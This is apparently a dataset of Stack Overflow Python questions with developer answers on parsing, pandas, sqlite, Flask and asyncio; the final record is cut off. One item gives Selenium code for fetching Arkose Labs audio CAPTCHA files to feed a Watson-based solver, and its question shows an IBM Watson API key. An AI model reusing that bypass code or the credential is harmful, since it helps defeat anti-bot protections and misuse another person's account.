{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to turn a text file, into a delimited list of lists<p>I am attempting to take information from a text file and turn it into a list of lists that I later do more with.\nThe text file is formatted so that each piece of information is separated by &quot;, &quot; and then at the end of each &quot;person&quot; there is a &quot;\\n&quot;\nFor example,\n111, Joe, Jones, 09-01-1980, 10-19-1999, 95000<\/p>\n<p>I am close. But stuck on one small thing.\nMy current code:<\/p>\n<pre><code>def readFile(fileName):\n    myFileObj = open(fileName, &quot;r&quot;)\n    peopleStr = myFileObj.read()\n    peopleList = peopleStr.split(&quot;\\n&quot;)\n    newPeopleList = []\n    for el in peopleList:\n        sub = el.split(&quot; ,&quot;)\n        newPeopleList.append(sub)\n    print(newPeopleList)\n    \n    return newPeopleList\n<\/code><\/pre>\n<p>This newPeopleList returns<\/p>\n<pre><code>[['111, Joe, Jones, 09-01-1980, 10-19-1999, 95000'], ['113, James, Jo, 10-02-1982, 10-18-1998, 85000'], ['123, Jordan, Joul, 08-04-1988, 10-17-1988, 80000']]\n<\/code><\/pre>\n<p>But what I need is<\/p>\n<pre><code>[[111, 'Joe', 'Jones', '09-01-1980', '10-19-1999', 95000], [113, 'James', 'Jo', '10-02-1982', '10-18-1998', 85000], [123, 'Jordan', 'Joul', '08-04-1988', '10-17-1988', 80000]]\n<\/code><\/pre>\n<p>So they each can be their own item in the list!<\/p>\n<p>I hope this makes some sense, and I appreciate any help!<\/p>","output_text":"<pre><code>listOfLists = []\n\nwith open(filename, &quot;r&quot;) as msg:\n   for line in msg:\n      listOfLists.append(line.strip().replace(&quot; &quot;,&quot;&quot;).split(&quot;,&quot;))\n   msg.close()\n<\/code><\/pre>\n<p>This should make it. You read your file line by line, you replace the blank spaces by nothing, you split by &quot;,&quot; each line to make a list of it that you store in your list of lists.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Chi-square test to test the adherence of my data to the poisson distribution<p>I have the dataset below with the number of car theft occurrences per day of the week in 2018 and I am looking to use the chi-square test to test the adherence of my data to the poisson distribution.<\/p>\n\n<pre><code>   DAY_WEEK DATE    NUMBER_OF_OCCURRENCES\n0   Monday  2018-01-01  82\n1   Monday  2018-01-08  162\n2   Monday  2018-01-15  147\n3   Monday  2018-01-22  133\n4   Monday  2018-01-29  176\n... ... ... ...\n360 Sunday  2018-12-02  78\n361 Sunday  2018-12-09  205\n362 Sunday  2018-12-16  77\n363 Sunday  2018-12-23  84\n364 Sunday  2018-12-30  59\n<\/code><\/pre>\n\n<p>In my df each line is equivalent to the day of the week in the year. Thus, the first line is equivalent to the first Monday and the 52 line is equivalent to 52 Monday and so on.<\/p>\n\n<p>Can anyone give me a light on how I test Poisson using chi-square in python? I've been on this issue for a few days and I haven't found a way to do that.<\/p>\n\n<p>Thank you very much in advance!!!<\/p>","output_text":"<p>You need to summarize your data into categories: find a reasonable bin width, (e.g. 20 thefts), and count how many data points fall into each bin.  Compare those against the expected values from a Poisson distribution with the same mean.  This is the comparison necessary to perform the chi-squared test.<\/p>\n\n<p>Note that, to keep this statistically sound, you must choose your bin width <em>before<\/em> you compare to the expected values.  Pick something that gives you a decent quantity of values in the modal bin, and tails off at a convenient rate.<\/p>\n\n<p>Also, cut off (on the right) the chi-squared test after one or two bins with 0 or 1 item, and an expected value comfortably below 1.<\/p>\n\n<hr>\n\n<p>To handle the days of the week individually is qualitatively the same, but larger quantitatively.  You have a separate series of bins for each day of the week.  You can use the same bin width for all days, or adjust according to that day's traffic intensity.<\/p>\n\n<p>For sake of illustration, let's assume that you find that 6 bins turn out to be convenient for each day.  This will give you 42 categories (6 bins\/day * 7 days) for your chi-squared test.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to efficiently insert key-value from one list of dictionaries to another based on a common key-value pair in Python?<p>I have this big list of dictionaries in python. An example of which is below:<\/p>\n<pre><code>big_list_dictionary = [{\n    'name': 'test = 1',\n    'id': 1,\n    'value': 30\n},{\n    'name': 'apple = 1',\n    'id': 2,\n    'value': 70\n},{\n    'name': 'orange = 1',\n    'id': 3,\n    'value': 10\n},{\n    'name': 'balloon = 1',\n    'id': 4,\n    'value': 20\n},{\n    'name': 'airplane = 1',\n    'id': 5,\n    'value': 40\n}]\n<\/code><\/pre>\n<p>and I have a list of two dictionaries with their total values<\/p>\n<pre><code>total1 = [{\n    'name': 'test',\n    'total': 130\n},{\n    'name': 'apple',\n    'total': 270\n},{\n    'name': 'orange',\n    'total': 310\n},{\n    'name': 'balloon',\n    'total': 420\n},{\n    'name': 'airplane',\n    'total': 540\n}]\n\ntotal2 = [{\n    'name': 'test',\n    'total': 230\n},{\n    'name': 'apple',\n    'total': 570\n},{\n    'name': 'orange',\n    'total': 3210\n},{\n    'name': 'balloon',\n    'total': 620\n},{\n    'name': 'airplane',\n    'total': 940\n}]\n<\/code><\/pre>\n<p>If you notice, the <code>name<\/code> in <code>total1<\/code> and <code>total2<\/code> is just slightly different than <code>big_list_dictionary<\/code> where <code>= 1<\/code> is omitted.<\/p>\n<p>How can I add the total values from <code>total1<\/code> and <code>total2<\/code> to <code>big_list_dictionary<\/code> so that the final result looks like the following:<\/p>\n<pre><code>[{\n    'name': 'test = 1',\n    'id': 1,\n    'value': 30,\n    'total2': 230,\n    'total1': 130\n},{\n    'name': 'apple = 1',\n    'id': 2,\n    'value': 70,\n    'total2': 570,\n    'total1': 270\n},{\n    'name': 'orange = 1',\n    'id': 3,\n    'value': 10,\n    'total2': 3210,\n    'total1': 310\n},{\n    'name': 'balloon = 1',\n    'id': 4,\n    'value': 20,\n    'total2': 620,\n    'total1': 420\n},{\n    'name': 'airplane = 1',\n    'id': 5,\n    'value': 40,\n    'total2': 940,\n    'total1': 540\n}]\n<\/code><\/pre>\n<p>Currently, the way I'm doing it is very slow.<\/p>\n<pre><code>    for item in big_list_dictionary:\n        for t1,t2 in zip(total1,total2):\n            if t1['name'] in item['name']:\n                item['total1] = t1['total']\n                item['total2'] = t2['total']\n<\/code><\/pre>\n<p>How can I do this efficiently?<\/p>","output_text":"<p>If the extra characters are always <code>=1<\/code> then you can create an intermediate relation and then use the following code.<\/p>\n<pre><code>big_list_dictionary = [{'name': 'test = 1','id': 1,'value': 30},{'name': 'apple = 1','id': 2,'value': 70},{'name': 'orange = 1','id': 3,'value': 10},{'name': 'balloon = 1','id': 4,'value': 20},{'name': 'airplane = 1','id': 5,'value': 40}]\n\ntotal1 = [{ 'name': 'test','total': 130},{'name': 'apple','total': 270},\n{'name': 'orange','total': 310},{'name': 'balloon','total': 420},{'name': 'airplane','total': 540}]\ntotal2 = [{'name': 'test','total': 230},{'name': 'apple','total': 570},{'name': 'orange','total': 3210},{'name': 'balloon','total': 620},{'name': 'airplane','total': 940}]\n\n\nintermediate = {i['name'].split('=')[0].strip():i for i in big_list_dictionary}\n\nfor t1, t2 in zip(total1, total2):\n    intermediate[t1['name']]['total1'] = t1['total']\n    intermediate[t1['name']]['total2'] = t2['total']\n\nprint(big_list_dictionary)\n<\/code><\/pre>\n<p>Output<\/p>\n<pre><code>[{'name': 'test = 1', 'id': 1, 'value': 30, 'total1': 130, 'total2': 230},\n {'name': 'apple = 1', 'id': 2, 'value': 70, 'total1': 270, 'total2': 570},\n {'name': 'orange = 1', 'id': 3, 'value': 10, 'total1': 310, 'total2': 3210},\n {'name': 'balloon = 1', 'id': 4, 'value': 20, 'total1': 420, 'total2': 620},\n {'name': 'airplane = 1', 'id': 5, 'value': 40, 'total1': 540, 'total2': 940}]\n<\/code><\/pre>\n<p><strong>Benchmark<\/strong><\/p>\n<p><code>%%timeit -n10 -r10<\/code> with <code>big_list_dictionary<\/code>, <code>total1<\/code> and <code>total2<\/code> of length <code>1000<\/code> each. Length has been increased to show the efficiency.<\/p>\n<p>This Solution<\/p>\n<p><code>513 \u00b5s \u00b1 17.2 \u00b5s per loop (mean \u00b1 std. dev. of 10 runs, 10 loops each)<\/code><\/p>\n<p>Your Solution<\/p>\n<p><code>91.6 ms \u00b1 1.19 ms per loop (mean \u00b1 std. dev. of 10 runs, 10 loops each)<\/code><\/p>\n<p><em><strong>This solution is faster. (<code>513 \u00b5s &lt; 91.6 ms<\/code>)<\/strong><\/em> The difference between both the solutions will only increase as the length increases.<\/p>\n<p><strong>Edit based on comments:<\/strong><\/p>\n<p>I believe there are some elements in <code>test1<\/code> and <code>test2<\/code> that are not in\n<code>big_list_dictionary<\/code>, as there is an assumption that <code>test1<\/code> and <code>test2<\/code> have the same elements in the same order, you can just iterate through one of the list and append if not found to <code>big_list_dictionary<\/code> and also add that to <code>intermediate<\/code>. This appends all the new dicts at the end of <code>big_list_dictionary<\/code>, adding at the end is faster than inserting at a random position. But if you do care about order, then I believe your solution is as good as it gets.<\/p>\n<p>Disclaimer : I have not tested this part of the code as I dont have the input or output to check the desired behavior.<\/p>\n<pre><code>big_list_dictionary = [{'name': 'test = 1','id': 1,'value': 30},{'name': 'apple = 1','id': 2,'value': 70},{'name': 'orange = 1','id': 3,'value': 10},{'name': 'balloon = 1','id': 4,'value': 20},{'name': 'airplane = 1','id': 5,'value': 40}]\ntotal1 = [{ 'name': 'test','total': 130},{'name': 'apple','total': 270},{'name': 'orange','total': 310},{'name': 'balloon','total': 420},{'name': 'airplane','total': 540}]\ntotal2 = [{'name': 'test','total': 230},{'name': 'apple','total': 570},{'name': 'orange','total': 3210},{'name': 'balloon','total': 620},{'name': 'airplane','total': 940}]\n\n\nintermediate = {i['name'].split('=')[0].strip():i for i in big_list_dictionary}\n\n\nfor t1 in total1:\n    if t1['name'] not in intermediate:         \n        temp_dict = {'name': t1['name'],'id': 0,'value': 0}\n        big_list_dictionary.append(temp_dict)\n        intermediate[t1['name']] = temp_dict\n\n\n# insert rest of the answer from code above\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to verify whether string value is in correct range in Data Frame in Python Pandas?<p>I have DataFrame in Python pandas like below (&quot;col1&quot; is data type string):<\/p>\n<pre><code>col1\n-------\n14212614414\n05261265140\n82044114467\n...\n<\/code><\/pre>\n<ul>\n<li>Fifth and sixth values mean day of born.<\/li>\n<\/ul>\n<p>How to check whether day are from the correct range, so fifth and sixth values should be from range 1 to 31.<\/p>\n<pre><code>col1        | col2\n------------|-------\n14212614414 | True\n05261265140 | True\n82044114467 | False\n...\n<\/code><\/pre>\n<p>How can Ido that in Python Pandas?<\/p>","output_text":"<p>You can use the series.str accessor and slice the string, then treat it as an int with <a href=\"https:\/\/pandas.pydata.org\/docs\/reference\/api\/pandas.Series.astype.html\" rel=\"nofollow noreferrer\">astype<\/a> and check if it's <a href=\"https:\/\/pandas.pydata.org\/docs\/reference\/api\/pandas.Series.between.html\" rel=\"nofollow noreferrer\">between<\/a> the numbers<\/p>\n<pre><code>df['col2']=df['col1'].str[4:6].astype(int).between(1,31)\n\n\ncol1    col2\n0   14212614414 True\n1   5261265140  True\n2   82044114467 False\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n how insert data in the sqlite3 tables while checking if exist using python<p>i am trying to store the urerID and the urls they received, so i made a connector table <code>Receive<\/code> to save the ids of user and url.<\/p>\n\n<p>There are 2 problems here:-<\/p>\n\n<p><strong>First problem<\/strong> :\nThe ids are not incremented not by 1 but by the number the code is executed multiplied by the number of urls sent, here this happen after user1 used the code twice : user1 typed in telegram chat <code>memes<\/code> twice and received 2 memes + 2 memes. then user2 used the bot. <\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/XENFd.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/XENFd.png\" alt=\"enter image description here\"><\/a><\/p>\n\n<p><strong>Second problem<\/strong> :\nHow to check in <code>Receive<\/code> table for the existence of both <code>USER_ID<\/code> and <code>URL_ID<\/code> aka : know if the user received the memes ?<\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/BO7UB.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/BO7UB.png\" alt=\"enter image description here\"><\/a><\/p>\n\n<p>Here is the <code>URLS<\/code> table:<\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/3CP3T.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/3CP3T.png\" alt=\"enter image description here\"><\/a><\/p>\n\n<p>The Tables:<\/p>\n\n<pre><code>CREATE TABLE USERS ( \nuserID INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,\nchatID INT(10) UNIQUE\n\n);\nCREATE TABLE URLS ( \nurlID INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT ,\nlinkID TEXT UNIQUE \n\n);\nCREATE TABLE Receive ( \nUSER_ID INTEGER ,\nURL_ID INTEGER ,\nPRIMARY KEY (USER_ID , URL_ID)\n\n)\n<\/code><\/pre>\n\n<p>the code: <\/p>\n\n<pre><code>def from_red():\n\nfor subm in reddit.subreddit('Memes').hot(limit=limit):\n\n        urlId = subm.url[18:][:-4] \n        info = last_data('getUpdates')\n        userid = get_chat_id(info)\n\n        #curr.execute('SELECT USER_ID and URL_ID FROM Receive ')\n        #e = curr.fetchone()\n\n        curr.execute('INSERT OR IGNORE INTO USERS (chatID) VALUES (?) ', (userid ,))\n        curr.execute('SELECT userID FROM USERS WHERE chatID = ? ', (userid , ))\n        id1 = curr.fetchone()[0]\n        print(id1)\n\n        curr.execute('INSERT OR IGNORE INTO URLS (linkID) VALUES (?) ', (urlId ,))\n        curr.execute('SELECT urlID FROM URLS WHERE linkID = ? ', (urlId , ))\n        id2 = curr.fetchone()[0]\n        print(id2)\n\n        curr.execute('INSERT OR REPLACE INTO Receive (USER_ID , URL_ID) VALUES (? , ?)' ,(id1 , id2))\n\n\n        send_pic(subm.url , subm.title)\n        time.sleep(1.5)\n\n        connection.commit()\n<\/code><\/pre>","output_text":"<p>For the first problem (ids not incremented by 1) : i removed <code>usrID<\/code> and <code>urlID<\/code> and used the <code>rowid<\/code> instead <\/p>\n\n<pre><code>curr.executescript('''\nCREATE TABLE IF NOT EXISTS USERS ( \n\nchatID INT(10) UNIQUE,\n\n);\nCREATE TABLE IF NOT EXISTS URLS ( \n\nlinkID TEXT UNIQUE \n\n);\nCREATE TABLE IF NOT EXISTS Receive ( \nUSER_ID INTEGER ,\nURL_ID INTEGER ,\nPRIMARY KEY (USER_ID , URL_ID)\n\n)\n\n''')\n<\/code><\/pre>\n\n<p>The fixed codes:<\/p>\n\n<pre><code>curr.execute('SELECT rowid FROM USERS WHERE chatID = ? ', (userid , ))\nid1 = curr.fetchone()[0]\n\ncurr.execute('SELECT rowid FROM URLS WHERE linkID = ? ', (urlId , ))\nid1 = curr.fetchone()[0]\n<\/code><\/pre>\n\n<p>For the second problem (checking for userID and the urls) :<\/p>\n\n<pre><code>        try:\n            curr.execute('INSERT INTO Receive (USER_ID , URL_ID) VALUES (? , ?)' ,(id1 , id2))\n            send_pic(subm.url , subm.title)\n            time.sleep(1.5)\n            connection.commit()\n\n        except sqlite3.IntegrityError as e:\n            ...\n            print('Anything else')\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n db returns NoneType, in flask documentation<pre><code>def get_db():\n    if 'db' not in g:\n        g.db = sqlite3.connect(\n            current_app.config['DATABASE'],\n            detect_types=sqlite3.PARSE_DECLTYPES\n        )\n        g.db.row_factory = sqlite3.Row\n        \n        return g.db\n<\/code><\/pre>\n<p>Hello, trying to learn flask. Currently going through it's documentation, just completed the tutorial for a simple app. For some reason I'm getting this error.<\/p>\n<blockquote>\n<p>AttributeError: 'NoneType' object has no attribute 'execute'<\/p>\n<\/blockquote>\n<pre><code>@bp.route('\/')\ndef index():\n    db = get_db()\n    \n    posts = db.execute(\n        'SELECT p.id, title, body, created, author_id, username'\n        ' FROM post p JOIN user u ON p.author_id = u.id'\n        ' ORDER BY created DESC'\n    ).fetchall()\n    # returns template, with the posts as parameter\n    return render_template('blog\/index.html', posts=posts)\n<\/code><\/pre>\n<p>This is where I'm getting an error. I also use the get_db() on other code and it works, but for some reason for index it doesn't.<\/p>","output_text":"<p>In your <code>get_db<\/code> function, you haven't handled the case where <code>db<\/code> is present in <code>g<\/code>.\nWhat you can do is that, you can put your return statement outside the first <code>'db' not in g<\/code> if check (which ensures that <code>g.db<\/code> is not None in all of the cases). This way, if <code>db<\/code> isn't present in <code>g<\/code> it will set it there and in all cases it will return <code>g.db<\/code>.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to save playing audio with Selenium Python<p>I'm developing a captcha solver using IBM Watson and all is well, I just need to save the playing audio to a file which can be then resolved using watson. I don't know how to go about that and I didn't find anything here. If possible I don't want some complicated requests etc, just save the playing audio to a file. Or download the audio, but I tried using chrome_options to set download location, but it just didn't work\nAny help will be really appreciated<\/p>\n<p>my code:<\/p>\n<pre><code>import os\nimport time\nimport random\nimport requests\nfrom selenium import webdriver\nfrom selenium.webdriver.chrome.options import Options\nfrom selenium.common.exceptions import NoSuchElementException\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support import expected_conditions as EC\nfrom multiprocessing import Process\nimport ibm_watson\nfrom ibm_watson import SpeechToTextV1\nfrom ibm_cloud_sdk_core.authenticators import IAMAuthenticator\nfrom ibm_watson.websocket import RecognizeCallback, AudioSource\n\nchrome_options = Options()\nchrome_options.add_argument(&quot;--mute-audio&quot;)\nchrome_options.add_argument (&quot;download.default_directory=\/home\/valentino\/&quot;)\ndriver = webdriver.Chrome(options=chrome_options)\n\napikeywatson = 'C2f79A8ENbeUmWw-1DwTMd_v4IgCdCjqKpx21PsRaKan'\nurlwatson = 'https:\/\/api.eu-de.speech-to-text.watson.cloud.ibm.com\/instances\/9a22253e-7fc5-4c67-b85b-5ad54db8282d'\nauthibm = IAMAuthenticator(apikeywatson)\nstt = SpeechToTextV1(authenticator=authibm)\nstt.set_service_url(urlwatson)\n\ndriver.get('https:\/\/client-demo.arkoselabs.com\/github')\ntime.sleep(4)\nWebDriverWait(driver, 10).until(EC.frame_to_be_available_and_switch_to_it((By.CSS_SELECTOR, &quot;iframe[src^='https:\/\/client-api.arkoselabs.com\/fc\/gc\/']&quot;)))\ntime.sleep(2)\nWebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, &quot;span[class='fc_meta_audio_btn']&quot;))).click()\nWebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, &quot;audio_play&quot;))).click()\n<\/code><\/pre>","output_text":"<p>I believe I have been through a similar situation. If your file is successfully downloading, but downloading in default directory, and not your desired directory, I will let you know what and how can you get around this issue.<\/p>\n<ol>\n<li><p>Dont use relative path, try using absolute path:<\/p>\n<p><code>chrome_options.add_argument (f&quot;download.default_directory={}\/home\/valentino\/&quot;)<\/code><\/p>\n<\/li>\n<li><p>That will probably not work, try replacing forward slash with backward slash:<\/p>\n<p><code>chrome_options.add_argument (f&quot;download.default_directory={}\\\\home\\\\valentino\\\\&quot;)<\/code><\/p>\n<\/li>\n<li><p>If that worked for you, you are good to go. But it didn't work for me. I had to adopt an ugly turnaround for this problem by manually moving the file from downloaded folder to my desired folder. You can use something like this:<\/p>\n<\/li>\n<\/ol>\n<pre><code>    from shutil import move\n\n    #verify this path as it varies from OS to OS\n    default_file_download_path = 'C:\\\\Users\\\\UserName\\\\Downloads\\\\' \n    destination_path = 'home\\\\valentino\\\\'\n    \n    downloaded_file_name = [x for x in os.listdir(default_file_download_path)\n                            if &quot;audio_verification_challenge&quot; in x][0]\n    \n    move(default_file_download_path+downloaded_file_name , destination_path+downloaded_file_name)\n<\/code><\/pre>\n<p>Yes, the last option probably looks very ugly but it was the only way I could make it work for my use case.<\/p>\n<br>\n<p><strong>UPDATE<\/strong><\/p>\n<p>If you closely inspect the HTML, they provide a sweet SRC link for every audio file. You need to retrieve the file from that SRC by using simple requests call and then save it in locally. I believe this is the easiest and fastest way.<\/p>\n<pre><code>driver.get('https:\/\/client-demo.arkoselabs.com\/github')\ntime.sleep(4)\nWebDriverWait(driver, 10).until(EC.frame_to_be_available_and_switch_to_it((By.CSS_SELECTOR, &quot;iframe[src^='https:\/\/client-api.arkoselabs.com\/fc\/gc\/']&quot;)))\n\naudio_src = driver.find_element_by_xpath('\/\/audio[@preload=&quot;auto&quot;]').get_attribute('src')\ncontent = requests.get(audio_src).content\n# save the content into a file where you would want to\nopen('your_desired_location\\\\captcha_file.wav', 'wb').write(content)\n<\/code><\/pre>\n<hr \/>\n<p>If you get this error <code>requests.exceptions.ConnectionError: ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response',))<\/code>, then you should had an header to the requests. Simply replace the <code>content = <\/code> line with something like (as explained <a href=\"https:\/\/stackoverflow.com\/a\/63650371\/3154274\">here<\/a>):<\/p>\n<pre><code>content = requests.get(audio_src,headers={\n&quot;User-Agent&quot; : &quot;Mozilla\/5.0 (X11; Linux x86_64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/51.0.2704.103 Safari\/537.36&quot;\n}).content\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n change unordered data in python as ordered dataframe<p>i have given txt file in following format<\/p>\n<pre><code>a: 40     b: 20    c: 20     d: 00 23 4f 40 5f\na: 20     b: 30    c: 50     d: 23 45 21 54 43\na: 20     b: 30    c: 50     d: 23 45 21 \na: 20     b: 30    c: 50     d: \n<\/code><\/pre>\n<p>i used read_csv() function to read the fiven file. However i am struggling with make this type of format as dataframe in order to analyze.<\/p>\n<p>the final dataframe i want is<\/p>\n<pre><code>a    b    c    d_1   d_2   d_3   d_4   d_5\n40   20   20   00    23    4f    40    5f\n20   30   50   23    45    21    54    43\n20   30   50   23    45    21\n20   30   50   \n<\/code><\/pre>\n<p>I Have tried split function using ' ' as divisor. However since there is data that are not written it causes disorder.<\/p>\n<p>Is there another way to make this type of data as data frame.<\/p>","output_text":"<p>It may be hard if you try to find a way to load it with read_csv(). I think it would be better if you clean your data before loading it into a data frame.<\/p>\n<pre><code>def check_index(list, index):\n    return &quot;&quot; if index &gt; (len(list)-1) else list[index].rstrip()\n\na, b, c, d1 ,d2, d3, d4, d5 = [] , [] ,[] , [],[] , [] ,[] , []\nwith open('.\/text.txt') as file:\n    for line in file.readlines():\n        values = list(compo.split(': ')[1] for compo in line.split('    ')) # 4 space split according to your sample data\n        a.append(values[0])\n        b.append(values[1])\n        c.append(values[2])\n        d_values = values[3].split(' ')\n        d1.append(check_index(d_values,0))\n        d2.append(check_index(d_values,1))\n        d3.append(check_index(d_values,2))\n        d4.append(check_index(d_values,3))\n        d5.append(check_index(d_values,4))\n\ndf = pd.DataFrame(list(zip(a, b, c, d1 ,d2, d3, d4, d5)), columns = ['a', 'b', 'c', 'd1', 'd2', 'd3', 'd4', 'd5'])\n<\/code><\/pre>\n<p><a href=\"https:\/\/i.stack.imgur.com\/vdSrs.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/vdSrs.png\" alt=\"enter image description here\" \/><\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How does asyncio main thread manage running either the event loop and coroutines at the same time?<p>Firs of all, I apologize for my English.\nI am learning python asyncio module and I get confused at some point. I learn from the doc that the main purpose of the event loop is to schedule coroutines for running, open newtwork I\/O... A running coroutine can yield control back to the event loop by awaiting itself, so correct me if I am wrong, for the above to be possible, the event loop is needed to be always running on the main thread ? If so, how does asyncio manage running either the event loop and the coroutine at the same time on the same thread ? Perhaps there is a mechanism to suspend the event loop and resume it when needed ? Or is the event loop has a dedicated thread (I am not sure)?<\/p>","output_text":"<h2>The event loop<\/h2>\n<p>An event loop is the thread that runs the coroutines and also waits on events to happen.<\/p>\n<pre><code>*------------*\n^            |\n|         wait for next event\n|            |\n|         get coroutine that handles the event\n|            |\n|         resume coroutine\n|            |\n|         coroutine exits or enqueues a new event to wait on\n|            |\n*------------*\n<\/code><\/pre>\n<p>An event can only be handled when the event loop gets back to the top of the loop and asks the OS for any events that need to be handled. Events finishing do not interrupt the current coroutine.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Jinja for loop acting up with sidebar<p>I am attempting to make a simple todo\/task tracker. I have a table that displays all the tasks and their corresponding information. I would like the user to be able to click edit and have a sidebar that contains a form allowing the user to edit the task. The form is inside the for loop that goes over the tasks. However, the sidebar for any task only shows the first tasks information. Please see my code below:<\/p>\n<pre><code>table id=&quot;myTable&quot; class=&quot;table-auto border-collapse w-full&quot; style=&quot;height: 100% !important;&quot; &gt;\n      &lt;thead&gt;\n        &lt;tr class=&quot;rounded-lg text-sm font-medium font-normal text-gray-700 text-left&quot; style=&quot;font-size: 0.9674rem; &quot;&gt;\n          &lt;th width=&quot;30%&quot; id=&quot;th-sm&quot; class=&quot;px-4 py-2 bg-gray-200&quot; style=&quot;background-color:#FAFAFA;font-weight: 500;&quot;&gt;Task Name &lt;img style=&quot;display: inline-block; opacity: 0.5;&quot; src=&quot;https:\/\/img.icons8.com\/material-sharp\/12\/000000\/sort.png&quot;\/&gt;&lt;\/th&gt;\n          &lt;th id=&quot;th-sm&quot; class=&quot;px-4 py-2 bg-gray-200;&quot; style=&quot;background-color:#FAFAFA;font-weight: 500;&quot;&gt;Status\/Progress &lt;img style=&quot;display: inline-block; opacity: 0.5;&quot; src=&quot;https:\/\/img.icons8.com\/material-sharp\/12\/000000\/sort.png&quot;\/&gt;&lt;\/th&gt;\n          &lt;th id=&quot;th-sm&quot; class=&quot;px-4 py-2 bg-gray-200;;&quot; style=&quot;background-color:#FAFAFA;font-weight: 500;&quot;&gt;Due Date &lt;img style=&quot;display: inline-block; opacity: 0.5; &quot; src=&quot;https:\/\/img.icons8.com\/material-sharp\/12\/000000\/sort.png&quot;\/&gt;&lt;\/th&gt;\n          &lt;th id=&quot;th-sm&quot; class=&quot;px-4 py-2 bg-gray-200 &quot; style=&quot;background-color:#FAFAFA;font-weight: 500;&quot;&gt;Time Logged &lt;img style=&quot;display: inline-block; opacity: 0.5;&quot; src=&quot;https:\/\/img.icons8.com\/material-sharp\/12\/000000\/sort.png&quot;\/&gt;&lt;\/th&gt;\n          &lt;th id=&quot;th-sm&quot; class=&quot;px-4 py-2 bg-gray-200 &quot; style=&quot;background-color:#FAFAFA;font-weight: 500;&quot;&gt;Task Lead &lt;img style=&quot;display: inline-block; opacity: 0.5;&quot; src=&quot;https:\/\/img.icons8.com\/material-sharp\/12\/000000\/sort.png&quot;\/&gt;&lt;\/th&gt;\n          &lt;th width=&quot;auto&quot; id=&quot;th-sm&quot; class=&quot;px-4 py-2 bg-gray-200 &quot; style=&quot;background-color:#FAFAFA;font-weight: 500;&quot;&gt;&lt;\/th&gt;\n        &lt;\/tr&gt;\n      &lt;\/thead&gt;\n      &lt;tbody class=&quot;text-sm font-normal text-gray-700&quot;&gt;\n        {% for todo in update_todo %}\n        &lt;tr class=&quot;hover:bg-gray-100 border-b border-gray-200 py-10&quot;&gt;\n          &lt;td class=&quot;px-4 py-4&quot; style=&quot;font-size:1rem; font-weight: 600;&quot; onclick=&quot;openNav_details()&quot;&gt;{{todo['taskname']}}&lt;\/td&gt;\n\n          &lt;td class=&quot;px-4 py-4&quot;&gt;\n            &lt;div class=&quot;relative pt-1&quot;&gt;\n              &lt;div class=&quot;flex mb-2 items-center justify-between&quot;&gt;\n                &lt;div&gt;\n                  &lt;span class=&quot;text-xs inline-block text-gray-600&quot;&gt;\n                    {{todo['taskprogress']}}\n                  &lt;\/span&gt;\n                &lt;\/div&gt;\n              &lt;\/div&gt;\n              &lt;div class=&quot;h-2 mb-4 text-xs flex rounded bg-gray-200&quot;&gt;\n                &lt;div style=&quot;{{todo['taskprogress']}}&quot; class=&quot;shadow-none flex flex-col text-center whitespace-nowrap text-white justify-center bg-gray-500&quot;&gt;&lt;\/div&gt;\n              &lt;\/div&gt;\n            &lt;\/div&gt;\n        &lt;\/td&gt;\n\n          &lt;td class=&quot;px-4 py-4&quot;&gt;{{todo['completedate'][0:10]}}&lt;\/td&gt;\n       \n          &lt;td class=&quot;px-4 py-4&quot; &gt;25h 18m\n          &lt;\/td&gt;\n        \n          &lt;td class=&quot;px-4 py-4&quot;&gt;{{todo['assignee']}}&lt;\/td&gt;\n  \n          &lt;td class=&quot;px-4 py-4&quot;&gt;\n          &lt;div class=&quot;dropdown inline-block relative&quot;&gt;\n            &lt;button class=&quot;text-gray-700 font-semibold py-2 px-4 rounded inline-flex items-center&quot;&gt;\n              &lt;span class=&quot;mr-1&quot;&gt;&lt;img src=&quot;https:\/\/img.icons8.com\/small\/16\/000000\/more.png&quot;\/&gt;&lt;\/span&gt;\n              &lt;svg class=&quot;fill-current h-4 w-4&quot; xmlns=&quot;http:\/\/www.w3.org\/2000\/svg&quot; viewBox=&quot;0 0 20 20&quot;&gt;&lt;path d=&quot;M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z&quot;\/&gt; &lt;\/svg&gt;\n            